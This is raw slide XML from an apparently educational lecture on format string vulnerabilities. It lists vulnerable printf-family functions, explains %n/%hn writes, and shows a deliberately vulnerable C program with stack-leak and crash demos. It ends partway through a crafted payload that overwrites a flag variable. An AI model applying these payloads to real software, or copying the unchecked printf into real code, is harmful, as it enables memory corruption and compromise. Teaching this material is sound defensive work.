              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>1999</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>年首次发现格式化字符串漏洞</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>Newsham</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>攻击文章（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>2001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利用</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>%</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>x、%n</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>任意读写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007" y="1600200"/>
            <a:ext cx="3078672" cy="342650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78" y="4379952"/>
            <a:ext cx="5578229" cy="150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2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Vulnerable Functions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kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>• </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>fprintf</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> — prints to a FILE stream</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>• </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>printf</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> — prints to the ‘</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>stdout</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>’ stream</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>• </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>sprintf</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> — prints into a string</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>• </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>snprintf</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> — prints into a string with length checking</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>• </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>vfprintf</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> — print to a FILE stream from a </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>va_arg</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> structure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>• </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>vprintf</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> — prints to ‘</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>stdout</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>’ from a </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>va_arg</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> structure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>• </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>vsprintf</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> — prints to a string from a </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>va_arg</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> structure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>• </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>vsnprintf</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> — prints to a string with length checking from a </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>va_arg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structure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>• </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>setproctitle</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> — set </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>argv</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>[]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>• syslog — output to the syslog facility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786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一些特殊的占位符</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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 smtClean="0"/>
              <a:t>%s </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>–</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t> 打印地址指向的字符串</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US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%n </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>–</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t> 内存写入，写入值为当前为止打印的字符长度</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>printf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>(“1%n”,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0x41414141)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>%</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" err="1" smtClean="0"/>
              <a:t>Nc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t> –</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t> 格式控制，输出长度为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>N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 err="1" smtClean="0"/>
              <a:t>printf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>“%1234x%</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>n”,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>1, 0x41414141)</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>N$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t> - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>占位符对应第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个参数</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>printf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>(“%2$d”,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1,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2)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>%hn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>%hhn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>work on </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>gcc），分别写入两个字节和一个字节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7555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Example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96890" y="2490422"/>
            <a:ext cx="7421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47473" y="1417638"/>
            <a:ext cx="7732322" cy="5078314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</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> 1 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#include &lt;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stdio.h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&gt;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 2 #include &lt;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string.h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&gt;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 3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 4 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flag = 0;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 5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 6 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main(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argc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, char **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argv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) {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 7     char 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[1024];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 8     if (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argc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&lt; 2) return 1;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 9     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strncpy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, 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argv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[1], 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sizeof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) - 1);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10     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printf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);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11     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printf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("\n");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12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13     if (flag == 0x13371337) {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14         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printf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("You Win!\n");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15     }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16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17     return 0;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18 }</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00FF00"/>
              </a:solidFill>
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consola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41652" y="4943488"/>
            <a:ext cx="2664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 smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>How to Win?</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN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4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泄露内存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崩溃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971210" y="1643679"/>
            <a:ext cx="7520648" cy="2585323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00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>[</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>kelwin@arch</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>tmp</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>]$ ./</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>fmt</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t> %x:%x:%x:%x:%x:%x</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ffffda9c:3ff:1b1ea4:253a7825:78253a78:</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3a78253a</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00FF00"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>[</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>kelwin@arch</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>tmp</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>]$ ./</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>fmt</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t> %s:%s:%s:%s:%s:%s</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Segmentation fault (core dumped</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="00FF00"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>[</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>kelwin@arch</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>tmp</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>]$ ./</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>fmt</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t> AAAABBBBCCCC</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Segmentation fault (core dumped)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US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63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367288" y="1854653"/>
            <a:ext cx="5379007" cy="397031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</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> 1 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#include &lt;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stdio.h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&gt;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2 #include &lt;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string.h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&gt;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3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4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flag = 0;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5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6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main(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argc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, char **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argv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) {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7     char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[1024];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8     if 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argc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&lt; 2) return 1;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9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strncpy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,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argv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[1],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sizeof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) - 1);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10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printf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);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11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printf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("\n");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12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13     if (flag == 0x13371337) {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14    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printf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("You Win!\n");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15     }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16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17     return 0;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18 }</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00FF00"/>
              </a:solidFill>
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas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537894"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="468313" y="2259277"/>
          <a:ext cx="2475534" cy="31122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5534"/>
              </a:tblGrid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dirty="0" smtClean="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>CCCC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dirty="0" smtClean="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>BBBB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AAAA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706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…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93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fmt</a:t>
                      </a:r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 string </a:t>
                      </a:r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ptr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修改内存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373542" y="1218684"/>
            <a:ext cx="7520648" cy="3693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dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>[</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>kelwin@arch</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>tmp</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>]$ ./</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>fmt</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>AAAABBBBCCCC</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN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86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367288" y="1854653"/>
            <a:ext cx="5379007" cy="397031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</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> 1 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#include &lt;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stdio.h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&gt;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2 #include &lt;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string.h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&gt;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3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4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flag = 0;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5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6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main(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argc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, char **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argv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) {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7     char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[1024];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8     if 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argc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&lt; 2) return 1;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9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strncpy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,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argv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[1],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sizeof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) - 1);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10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printf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);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11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printf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("\n");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12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13     if (flag == 0x13371337) {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14    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printf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("You Win!\n");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15     }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16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17     return 0;</a:t>
            </a:r>
          </a:p>
          <a:p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18 }</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00FF00"/>
              </a:solidFill>
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas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120275"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="468313" y="2259277"/>
          <a:ext cx="2475534" cy="34475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5534"/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000" dirty="0" smtClean="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>%4911x%7$hn%65536x%8$hn</a:t>
                      </a:r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0x804a036</a:t>
                      </a:r>
                      <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" b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0x804a034</a:t>
                      </a:r>
                      <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" b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7064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…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2693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fmt</a:t>
                      </a:r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 string </a:t>
                      </a:r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ptr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修改内存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784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修改内存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145529" y="1730844"/>
            <a:ext cx="6885627" cy="341632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00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>./</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>fmt</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t> $(python2 -c 'print "\</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>x34\xa0\</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>x04\x08\</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>x36\xa0\</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>x04\x08%4911x</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>%7$</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>hn%65536x</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
